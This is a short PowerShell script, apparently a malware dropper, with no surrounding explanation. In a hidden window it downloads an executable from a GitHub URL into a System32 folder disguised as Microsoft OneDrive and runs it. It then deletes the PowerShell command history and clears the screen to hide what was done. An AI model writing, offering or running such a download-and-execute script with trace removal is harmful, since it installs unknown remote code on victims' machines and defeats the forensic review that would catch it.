powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/bORG2.exe?dl=1 -O $Env:SystemRoot\System32\Microsoft_OneDrive\BQ\bORG2.exe
start-process "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\bORG2.exe"
Remove-Item (Get-PSreadlineOption).HistorySavePath
cls
exit
